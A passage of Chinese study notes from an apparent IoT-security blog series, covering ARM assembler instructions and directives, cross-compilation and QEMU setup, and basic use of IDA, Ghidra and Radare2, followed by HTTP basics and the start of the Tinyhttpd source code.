<p>{^}为可选后缀，当指令为LDM且寄存器列表中包含R15，选用改后缀时表示；除了正常的数据传送之外，还将SPSR复制到CPSR。同时，该后缀还表示传入或传出的是用户模式下的寄存器，而不是当前模式下的寄存器。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813215039588.png" alt="image-20220813215039588"></p>
<h5 id="1-2-8-异常产生指令"><a href="#1-2-8-异常产生指令" class="headerlink" title="1.2.8 异常产生指令"></a>1.2.8 异常产生指令</h5><p><strong>SWI指令</strong></p>
<p>格式：<code>SWI&#123;条件&#125; 24位的立即数</code></p>
<p>SWI指令用于产生软件中断，以便用户程序能调用操作系统的系统例程。操作系统在SWI的异常处理程序中提供相应的系统服务，指令中24位的立即数指定用户程序调用系统例程的类型，相关参数通过通用寄存器传递，当指令中24位的立即数被忽略时，用户程序调用系统例程的类型由通用寄存器R0的内容决定，同时，参数通过其他通用寄存器传递。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SWI 0x02	;该指令调用操作系统编号为02的系统例程。</span><br></pre></td></tr></table></figure>

<h4 id="1-3-伪代码"><a href="#1-3-伪代码" class="headerlink" title="1.3 伪代码"></a>1.3 伪代码</h4><p><strong>AREA</strong></p>
<p>一个汇编程序至少要包含一个段，当程序太长时，也可以将程序分为多个代码段和数据段，因此在汇编程序的开头，一般的语句会用到AREA。</p>
<p>语法格式：<code>AREA 段名 属性1,属性2,......</code></p>
<p>AREA伪指令用于定义一个代码段或数据段。其中，段名若以数字开头，则该段名需用“|”括起来，如|1_test|。属性字段表示该代码段（或数据段）的相关属性，多个属性用逗号分隔。常用的属性如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- CODE 属性:用于定义代码段，默认为READONLY。</span><br><span class="line">- DATA 属性:用于定义数据段，默认为READWRITE。</span><br><span class="line">- READONLY 属性:指定本段为只读，代码段默认为READONLY。</span><br><span class="line">- READWRITE　属性:指定本段为可读可写，数据段的默认属性为READWRITE。</span><br></pre></td></tr></table></figure>

<p><strong>ALIGN</strong></p>
<p>格式：<code>ALIGN&#123; 表达式&#123; ,偏移量&#125;&#125;</code></p>
<p>ALIGN伪指令可通过添加填充字节的方式，使当前位置满足一定的对其方式。其中，表达式的值用于指定对齐方式，可能的取值为2的幂，如1、2、4、8、16等。若未指定表达式,则将当前位置对齐到下一个字的位置。偏移量也为一个数字表达式,若使用该字段,则当前位置的对齐方式为: 2的表达式次幂+偏移量。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813220521921.png" alt="image-20220813220521921"></p>
<p><strong>CODE16，CODE32</strong></p>
<p>格式：<code>CODE16(或CODE32)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE16 伪指令通知编译器，其后的指令序列为16位的Thumb指令。</span><br><span class="line">CODE32 伪指令通知编译器，其后的指令序列为32为的ARM指令。</span><br></pre></td></tr></table></figure>

<p>若在汇编源程序中同时包含ARM指令和Thumb指令时，可用CODE16 伪指令通知编译器其后的指令序列为16 位的Thumb指令，CODE32 伪指令通知编译器其后的指令序列为32位的ARM指令。因此，在使用ARM指令和Thumb指令混合编程的代码里，可用这两条伪指令进行切换,但注意他们只通知编译器其后指令的类型，并不能对处理器进行状态的切换。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813220825289.png" alt="image-20220813220825289"></p>
<p><strong>ENTRY</strong></p>
<p>格式：<code>ENTRY</code></p>
<p>ENTRY伪指令用于指定汇编程序的入口点。在一个完整的汇编程序中至少要有一个ENTRY（也可以有多个,当有多个ENTRY时,程序的真正入口点由链接器指定），但在一个源文件里最多只能有一个ENTRY。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813221118983.png" alt="image-20220813221118983"></p>
<p><strong>END</strong></p>
<p>格式：<code>END</code></p>
<p>END伪指令用于通知编译器已经到了源程序的结尾。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813221219259.png" alt="image-20220813221219259"></p>
<h3 id="2-ARM环境搭建"><a href="#2-ARM环境搭建" class="headerlink" title="2. ARM环境搭建"></a>2. ARM环境搭建</h3><ul>
<li>操作系统: Ubuntu x64 TLS + Windows 7</li>
<li>ARM IDE: <a href="https://www.keil.com/">Keil uVersion</a>（Eclipse IDE for C&#x2F;C++ + ARM插件<br>&#x2F;ADS&#x2F;realview等）</li>
<li>交叉编译: arm-linux - gnueabi*</li>
<li>模拟环境: qenu</li>
</ul>
<p><strong>交叉环境搭建</strong></p>
<p>ARM交叉编译链接工具-arm-linux-gnueabi-gcc</p>
<p><code>sudo apt-get install gcc-arm-linux-gnueabi g++-arm-linux-gnueabi</code></p>
<p>ARM交叉编译链接工具-arm-linux-gnueabihf-gcc</p>
<p><code>sudo apt-get install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf</code></p>
<p>安装Qemu</p>
<p><code>sudo apt-get install qemu</code></p>
<h3 id="3-ARM实战"><a href="#3-ARM实战" class="headerlink" title="3. ARM实战"></a>3. ARM实战</h3><p>keil示例：参见看雪课程</p>
<h4 id="QEMU示例-1"><a href="#QEMU示例-1" class="headerlink" title="QEMU示例"></a>QEMU示例</h4><p>demo.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同MIPS，动态编译如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813222810182.png" alt="image-20220813222810182"></p>
<p>静态编译如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813223007112.png" alt="image-20220813223007112"></p>
<h2 id="0x05-逆向分析环境搭建"><a href="#0x05-逆向分析环境搭建" class="headerlink" title="0x05 逆向分析环境搭建"></a>0x05 逆向分析环境搭建</h2><h3 id="1-逆向分析工具"><a href="#1-逆向分析工具" class="headerlink" title="1. 逆向分析工具"></a>1. 逆向分析工具</h3><h4 id="1-1-虚拟环境"><a href="#1-1-虚拟环境" class="headerlink" title="1.1 虚拟环境"></a>1.1 虚拟环境</h4><p>Vmware、VirtualBox、Qemu</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813223124207.png" alt="image-20220813223124207"></p>
<h4 id="1-2-静态反编译工具"><a href="#1-2-静态反编译工具" class="headerlink" title="1.2 静态反编译工具"></a>1.2 静态反编译工具</h4><p><strong>IDA Pro</strong>、Ghidra、Radare2</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813223348677.png" alt="image-20220813223348677"></p>
<p>Linux下常用的命令：</p>
<ul>
<li>objdump</li>
<li>arm-linux-gnueabihf-objdump</li>
<li>file</li>
<li>capstone</li>
<li>······</li>
</ul>
<h4 id="1-3-动态调试工具"><a href="#1-3-动态调试工具" class="headerlink" title="1.3 动态调试工具"></a>1.3 动态调试工具</h4><p>gdb，插件：peda、pwndbg、gef</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813224759473.png" alt="image-20220813224759473"></p>
<p><img src="D:/Typora/typora-user-images/image-20220813225001839.png" alt="image-20220813225001839"></p>
<h2 id="0x06-IDA使用详解"><a href="#0x06-IDA使用详解" class="headerlink" title="0x06 IDA使用详解"></a>0x06 IDA使用详解</h2><h3 id="1-反汇编"><a href="#1-反汇编" class="headerlink" title="1. 反汇编"></a>1. 反汇编</h3><h4 id="1-1-反汇编理论"><a href="#1-1-反汇编理论" class="headerlink" title="1.1 反汇编理论"></a>1.1 反汇编理论</h4><ul>
<li>第一代语言：机器语言</li>
<li>第二代语言：汇编语言</li>
<li>第三代语言：引入关键字和结构，可转化为汇编语言或机器语言，如C&#x2F;C++，JAVA等</li>
<li>第四代语言：旨在实现特定目标（例如开发商业应用程序）的语言，如：SQL等</li>
<li>第五代语言：允许程序员通过定义某些约束而不是编写算法来解决问题的编程语言，如：Prolog，Lisp等</li>
</ul>
<h4 id="1-2-何为反汇编？"><a href="#1-2-何为反汇编？" class="headerlink" title="1.2 何为反汇编？"></a>1.2 何为反汇编？</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220814110654997.png" alt="image-20220814110654997"></p>
<h4 id="1-3-反编译的困难"><a href="#1-3-反编译的困难" class="headerlink" title="1.3 反编译的困难"></a>1.3 反编译的困难</h4><ul>
<li>编译过程会造成损失</li>
<li>编译属于多对多操作</li>
<li>反编译器非常依赖于语言和库</li>
<li>要想准确地反编译一个二进制文件，需要近乎完美的反汇编能力</li>
</ul>
<h4 id="1-4-为何进行反汇编"><a href="#1-4-为何进行反汇编" class="headerlink" title="1.4 为何进行反汇编"></a>1.4 为何进行反汇编</h4><ul>
<li>分析恶意软件</li>
<li>漏洞分析</li>
<li>软件互操作性</li>
<li>编译器验证（后门）</li>
<li>显示调试信息</li>
</ul>
<h4 id="1-5-如何反汇编"><a href="#1-5-如何反汇编" class="headerlink" title="1.5 如何反汇编"></a>1.5 如何反汇编</h4><p>基本的反汇编算法：</p>
<ol>
<li>第一步：确定进行反汇编的代码区域</li>
<li>第二部：读取该地址（或文件偏移量）所包含的值，并执行一次表查找，将二进制操作码与它的汇编语言助记符对应起来</li>
<li>第三步：获取指令并解码任何所需的操作数后，需要对它的汇编语言等价形式进行格式化</li>
<li>第四步：逐条输出指令</li>
</ol>
<p>线性扫描反汇编</p>
<p>递归下降反汇编</p>
<h3 id="2-反汇编引擎"><a href="#2-反汇编引擎" class="headerlink" title="2. 反汇编引擎"></a>2. 反汇编引擎</h3><ul>
<li><p>ODDisassm.</p>
</li>
<li><p>BeaEngin.</p>
</li>
<li><p>udis86.</p>
</li>
<li><p><strong>Capstone.</strong></p>
</li>
<li><p>XDE</p>
</li>
</ul>
<h3 id="3-IDA"><a href="#3-IDA" class="headerlink" title="3. IDA"></a>3. IDA</h3><h4 id="3-1-IDA"><a href="#3-1-IDA" class="headerlink" title="3.1 IDA"></a>3.1 IDA</h4><p>交互式反汇编器专业版( Interactive Disassembler Professional)，人们常称其为IDA Pro，或简称为IDA。是目前最棒的一个静态反编译软件，为众多0day世界的成员和ShellCode安全分析人士不可缺少的利器!</p>
<h4 id="3-2-IDA目录结构"><a href="#3-2-IDA目录结构" class="headerlink" title="3.2 IDA目录结构"></a>3.2 IDA目录结构</h4><ul>
<li>cfg：包含各种配置文件，基本IDA配置文件ida.cfg，GUI配置文件idagui.cfg，文本模式用户界面配置文件idatui.cfg</li>
<li>idc：包含IDA内置脚本语言IDC所需要的核心文件</li>
<li>ids：包含一些符号文件</li>
<li>loaders：包含用于识别和解析PE或ELF</li>
<li>plugins：附加的插件模块</li>
<li>procs：包含处理器的模块</li>
</ul>
<h4 id="3-3-IDA快捷键"><a href="#3-3-IDA快捷键" class="headerlink" title="3.3 IDA快捷键"></a>3.3 IDA快捷键</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817100544311.png" alt="image-20220817100544311"></p>
<p><img src="D:/Typora/typora-user-images/image-20220817100825598.png" alt="image-20220817100825598"></p>
<h3 id="4-IDA实战"><a href="#4-IDA实战" class="headerlink" title="4. IDA实战"></a>4. IDA实战</h3><p>以arm编写的demo为例，使用32位IDA打开后如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817101927872.png" alt="image-20220817101927872"></p>
<p><strong>IDA自动化脚本实战</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817103109214.png" alt="image-20220817103109214"></p>
<p>python模块，文档地址：<a href="https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/">https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/</a></p>
<h2 id="0x07-Ghidra使用详解"><a href="#0x07-Ghidra使用详解" class="headerlink" title="0x07 Ghidra使用详解"></a>0x07 Ghidra使用详解</h2><h3 id="1-Ghidra"><a href="#1-Ghidra" class="headerlink" title="1. Ghidra"></a>1. Ghidra</h3><h4 id="1-1-什么是Ghidra？"><a href="#1-1-什么是Ghidra？" class="headerlink" title="1.1 什么是Ghidra？"></a>1.1 什么是Ghidra？</h4><p>Ghidra是一个软件逆向工程（SRE）框架，包括一套功能齐全的高端软件分析工具，使用户能够在各种平台上分析编译后的代码，包括Windows、Mac OS和Linux。功能包括反汇编，汇编，反编译，绘图和脚本，以及数百个其他功能。Ghidra支持各种处理器指令集和可执行格式,可以在用户交互模式和自动模式下运行。用户还可以使用公开的API开发自己的Ghidra插件和脚本。</p>
<h4 id="1-2-Ghidra下载地址"><a href="#1-2-Ghidra下载地址" class="headerlink" title="1.2 Ghidra下载地址"></a>1.2 Ghidra下载地址</h4><p><a href="https://ghidra-sre.org/">https://Ghidra-sre.org</a><br><a href="https://github.com/NationalSecurityAgency/Ghidra">https://github.com/NationalSecurityAgency/Ghidra</a></p>
<h4 id="1-3-Ghidra安装"><a href="#1-3-Ghidra安装" class="headerlink" title="1.3 Ghidra安装"></a>1.3 Ghidra安装</h4><p><strong>支持平台：</strong></p>
<ul>
<li>Windows 7&#x2F;Windows 10（64位）</li>
<li>Linux（64位）</li>
<li>MacOS（10.8.3）</li>
</ul>
<p><strong>安装条件</strong></p>
<ul>
<li>硬件条件：4G内存；1GB硬盘空间</li>
<li>软件条件：Java 11+</li>
</ul>
<h4 id="1-4-Ghidra模式"><a href="#1-4-Ghidra模式" class="headerlink" title="1.4 Ghidra模式"></a>1.4 Ghidra模式</h4><p><strong>Ghidra Server ：</strong></p>
<ul>
<li>Ghidra支持多人协作完成一个逆向项目，各种研究人员在自己设备上进行相关的逆向任务，并将其修改提交到公共的存储库中，相关配置在Ghidra Server中有详尽的说明。</li>
</ul>
<p><strong>命令行模式：</strong></p>
<ul>
<li>有别于传统的GUI模式,使用者可以通过命令行模式进行批量化的反编译工作。</li>
</ul>
<p><strong>独立的JAR包模式：</strong></p>
<ul>
<li>Ghidra允许将其中的部分文件打包为JAR包并单独运行，以便于更方便的通过命令行模式进行启动，也方便于作为单独的Java逆向工程库。使用者可以通过&#x2F;support&#x2F;buildGhidraJar创建单独的Ghidra. jar文件并使用</li>
</ul>
<h3 id="2-Ghidra实战"><a href="#2-Ghidra实战" class="headerlink" title="2. Ghidra实战"></a>2. Ghidra实战</h3><p>Ghidra安装：</p>
<p><a href="https://www.zzl14.xyz/2020/08/16/ghidra%E5%AE%89%E8%A3%85/">https://www.zzl14.xyz/2020/08/16/ghidra%E5%AE%89%E8%A3%85/</a></p>
<h2 id="0x08-Radare2使用详解"><a href="#0x08-Radare2使用详解" class="headerlink" title="0x08 Radare2使用详解"></a>0x08 Radare2使用详解</h2><h3 id="1-Radare2"><a href="#1-Radare2" class="headerlink" title="1. Radare2"></a>1. Radare2</h3><h4 id="1-1-Radare2简介"><a href="#1-1-Radare2简介" class="headerlink" title="1.1 Radare2简介"></a>1.1 Radare2简介</h4><p>开源世界中催生出了一个新的逆向工程框架——Radare2，它拥有非常强大的功能，包括反汇编、调试、打补丁、虚拟化等等，而且可以运行在几乎所有的主流平台上（GNU&#x2F;Linux、Windows、BSD、IOS、···）</p>
<h4 id="1-2-Radare2安装"><a href="#1-2-Radare2安装" class="headerlink" title="1.2 Radare2安装"></a>1.2 Radare2安装</h4><p>Install：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/radare/radare2.git</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> radare2</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./sys/install.sh</span></span><br></pre></td></tr></table></figure>

<p>Update：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./sys/install.sh</span></span><br></pre></td></tr></table></figure>

<p>Remove：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make uninstall</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make purge</span></span><br></pre></td></tr></table></figure>

<h4 id="1-3-Radare2命令行工具"><a href="#1-3-Radare2命令行工具" class="headerlink" title="1.3 Radare2命令行工具"></a>1.3 Radare2命令行工具</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817170505098.png" alt="image-20220817170505098"></p>
<h4 id="1-4-Radare2常用参数"><a href="#1-4-Radare2常用参数" class="headerlink" title="1.4 Radare2常用参数"></a>1.4 Radare2常用参数</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817170742436.png" alt="image-20220817170742436"></p>
<h4 id="1-5-rabin2常用参数"><a href="#1-5-rabin2常用参数" class="headerlink" title="1.5 rabin2常用参数"></a>1.5 rabin2常用参数</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817170844695.png" alt="image-20220817170844695"></p>
<h4 id="1-6-rasm2常用参数"><a href="#1-6-rasm2常用参数" class="headerlink" title="1.6  rasm2常用参数"></a>1.6  rasm2常用参数</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817171107093.png" alt="image-20220817171107093"></p>
<h4 id="1-7-rahash2常用参数"><a href="#1-7-rahash2常用参数" class="headerlink" title="1.7 rahash2常用参数"></a>1.7 rahash2常用参数</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817171556197.png" alt="image-20220817171556197"></p>
<h4 id="1-8-radiff2常用参数"><a href="#1-8-radiff2常用参数" class="headerlink" title="1.8 radiff2常用参数"></a>1.8 radiff2常用参数</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817171641638.png" alt="image-20220817171641638"></p>
<h4 id="1-9-rafind2常用参数"><a href="#1-9-rafind2常用参数" class="headerlink" title="1.9 rafind2常用参数"></a>1.9 rafind2常用参数</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817171725960.png" alt="image-20220817171725960"></p>
<h4 id="1-10-ragg2常用参数"><a href="#1-10-ragg2常用参数" class="headerlink" title="1.10 ragg2常用参数"></a>1.10 ragg2常用参数</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817171802188.png" alt="image-20220817171802188"></p>
<h4 id="1-10-rarun2常用参数"><a href="#1-10-rarun2常用参数" class="headerlink" title="1.10 rarun2常用参数"></a>1.10 rarun2常用参数</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817171916279.png" alt="image-20220817171916279"></p>
<h4 id="1-12-rax2常用参数"><a href="#1-12-rax2常用参数" class="headerlink" title="1.12 rax2常用参数"></a>1.12 rax2常用参数</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817171838753.png" alt="image-20220817171838753"></p>
<h4 id="1-13-r2交互式使用方法"><a href="#1-13-r2交互式使用方法" class="headerlink" title="1.13 r2交互式使用方法"></a>1.13 r2交互式使用方法</h4><p><img src="D:/Typora/typora-user-images/image-20220817171950947.png" alt="image-20220817171950947"></p>
<ul>
<li>r2 filename 加载文件</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817183743969.png" alt="image-20220817183743969"></p>
<ul>
<li>aaa分析程序中所有函数</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817184145080.png" alt="image-20220817184145080"></p>
<ul>
<li>加个问号查看帮助</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817184242297.png" alt="image-20220817184242297"></p>
<ul>
<li>afl显示主函数</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817184341077.png" alt="image-20220817184341077"></p>
<ul>
<li>s function跳转到想跳转的位置</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817184355344.png" alt="image-20220817184355344"></p>
<ul>
<li><p>VV进入图形化模式（hjkl移动图像）使用p&#x2F;P切换图形模式</p>
<p>空格切换文本模式，文本下可以使用p切换模式，小写的vv用来粗略浏览函数信息</p>
</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817184725699.png" alt="image-20220817184725699"></p>
<ul>
<li>pdf 查看当前的反汇编代码</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817185144956.png" alt="image-20220817185144956"></p>
<ul>
<li>pd x 打印汇编信息x条</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817185356148.png" alt="image-20220817185356148"></p>
<ul>
<li>“wa xxxx” 修改汇编指令为xxxx</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817185526909.png" alt="image-20220817185526909"></p>
<ul>
<li>px表示打印16进制数，默认从当前位置开始，参数控制打印的字节数</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817185641253.png" alt="image-20220817185641253"></p>
<ul>
<li>使用-d选项进入调试模式，输入！在调试的时候可以看到历史操作记录</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817185938450.png" alt="image-20220817185938450"></p>
<ul>
<li>pdc反汇编函数</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817190021277.png" alt="image-20220817190021277"></p>
<ul>
<li><p>pdg也是反汇编函数</p>
</li>
<li><p>afx查看调用函数</p>
</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817190122323.png" alt="image-20220817190122323"></p>
<h4 id="1-14-r2-Web-GUI"><a href="#1-14-r2-Web-GUI" class="headerlink" title="1.14 r2 Web GUI"></a>1.14 r2 Web GUI</h4><p><code>r2 -c=H [filename]</code></p>
<p>默认地址为 <a href="http://localhost:9090/%E3%80%82">http://localhost:9090/。</a></p>
<h4 id="1-15-r2-Cutter-GUI"><a href="#1-15-r2-Cutter-GUI" class="headerlink" title="1.15 r2 Cutter GUI"></a>1.15 r2 Cutter GUI</h4><p>cutter 是r2官方的GUI。</p>
]]></content>
      <categories>
        <category>IoT安全入门</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT安全入门05</title>
    <url>/2023/03/28/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IoT%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A805/</url>
    <content><![CDATA[<h1 id="第五章-物联网之嵌入式Web"><a href="#第五章-物联网之嵌入式Web" class="headerlink" title="第五章 物联网之嵌入式Web"></a>第五章 物联网之嵌入式Web</h1><h2 id="0x01-http协议讲解"><a href="#0x01-http协议讲解" class="headerlink" title="0x01 http协议讲解"></a>0x01 http协议讲解</h2><h3 id="1-Web通信原理介绍"><a href="#1-Web通信原理介绍" class="headerlink" title="1. Web通信原理介绍"></a>1. Web通信原理介绍</h3><p><strong>客户端和服务端通信</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220825231628792.png" alt="image-20220825231628792"></p>
<span id="more"></span>

<h3 id="2-HTTP协议简介"><a href="#2-HTTP协议简介" class="headerlink" title="2. HTTP协议简介"></a>2. HTTP协议简介</h3><p>HTTP（HyperText Transfer Protocol）超文本传输协议</p>
<p><strong>HTTP工作流程</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220825231748757.png" alt="image-20220825231748757"></p>
<p><strong>HTTP请求报文格式</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220825231824748.png" alt="image-20220825231824748"></p>
<p><strong>HTTP相应报文格式</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220825231909571.png" alt="image-20220825231909571"></p>
<p><strong>HTTP常见请求方法</strong></p>
<ul>
<li>GET：请求指定页面信息，并返回实体主体；</li>
<li>POST：向指定资源提交数据并进行处理请求，数据被包含在请求体中，POST请求可能会导致新的资源的建立或已有资源的修改；</li>
<li>HEAD：类似GET请求，只不过返回的响应中没有具体内容，用于获取报头；</li>
<li>PUT：从客服端向服务器传送的数据取代指定的文档内容</li>
<li>DELETE：请求服务器删除指定的内容；</li>
<li>CONNECT：HTTP1.1协议中预留给能够将连接改为管道方式的代理服务器；</li>
<li>TRANCE：回显服务器收到的请求，主要用于测试或诊断；</li>
</ul>
<p><strong>HTTP常见Header</strong></p>
<ul>
<li>Host: <a href="http://www.test.com/">www.test.com/</a> &#x2F;&#x2F;请求的目标域名和端口号</li>
<li>Origin: <a href="http://localhost:8081/">http://localhost:8081/</a> &#x2F;&#x2F;请求的来源域名和端口号 （跨域请求时，浏览器会自动带上这个头信息）</li>
<li>Referer: https:&#x2F;localhost:8081&#x2F;link?query&#x3D;xxxxx &#x2F;&#x2F;请求资源的完整URI</li>
<li>User-Agent &#x2F;&#x2F;浏览器信息</li>
<li>Cookie: &#x2F;&#x2F;当前域名下的Cookie</li>
<li>Accept: text&#x2F;html,image&#x2F;apng &#x2F;&#x2F;代表客户端希望接受的数据类型是html或者是png图片类型</li>
<li>Accept-Encoding: gzip, deflate &#x2F;&#x2F;代表客户端能支持gzip和deflate格式的压缩</li>
<li>Accept-Language: zh-CN,zh;q&#x3D;0.9 &#x2F;&#x2F;代表客户端可以支持语言zh-CN或者zh</li>
<li>Connection: keep-alive &#x2F;&#x2F;告诉服务器，客户端需要的tcp连接是一个长连接</li>
<li>If-None-Match &#x2F;&#x2F;如果内容未改变返回304代码，对应Etag</li>
<li>If-Modified-Since &#x2F;&#x2F;对应last-midified，未被修改则返回304代码</li>
<li>Date: &#x2F;&#x2F;服务端发送资源时的服务器时间</li>
<li>Expires: &#x2F;&#x2F;缓存过期时间</li>
<li>Cache-Control: no-cache &#x2F;&#x2F; 缓存方式</li>
<li>Etag &#x2F;&#x2F; 文件内容hash</li>
<li>Last-Modified &#x2F;&#x2F;最近一次文件修改时间</li>
<li>Content-Type: text&#x2F;html; charset&#x3D;utf-8 &#x2F;&#x2F;编码格式</li>
<li>Content-Encoding: gzip &#x2F;&#x2F;采用gzip对资源进行解码</li>
<li>Connection: keep-alive &#x2F;&#x2F;tcp是长连接</li>
<li>Set-Cookie &#x2F;&#x2F;设置Http Cookie</li>
</ul>
<h2 id="0x02-Tinyhttpd源码分析"><a href="#0x02-Tinyhttpd源码分析" class="headerlink" title="0x02 Tinyhttpd源码分析"></a>0x02 Tinyhttpd源码分析</h2><p>Tinyhttpd是J. David Blackstone在1999年写的一个不到500行的超轻量型Http服务端程序，可以帮助我们真正理解服务器程序的本质。</p>
<p>Github仓库地址：<a href="https://github.com/nengm/Tinyhttpd">https://github.com/nengm/Tinyhttpd</a></p>
<p>Tinyhttpd源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* J. David&#x27;s webserver */</span></span><br><span class="line"><span class="comment">/* This is a simple webserver.</span></span><br><span class="line"><span class="comment"> * Created November 1999 by J. David Blackstone.</span></span><br><span class="line"><span class="comment"> * CSE 4344 (Network concepts), Prof. Zeigler</span></span><br><span class="line"><span class="comment"> * University of Texas at Arlington</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* This program compiles for Sparc Solaris 2.6.</span></span><br><span class="line"><span class="comment"> * To compile for Linux:</span></span><br><span class="line"><span class="comment"> *  1) Comment out the #include &lt;pthread.h&gt; line.</span></span><br><span class="line"><span class="comment"> *  2) Comment out the line that defines the variable newthread.</span></span><br><span class="line"><span class="comment"> *  3) Comment out the two lines that run pthread_create().</span></span><br><span class="line"><span class="comment"> *  4) Uncomment the line that runs accept_request().</span></span><br><span class="line"><span class="comment"> *  5) Remove -lsocket from the Makefile.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 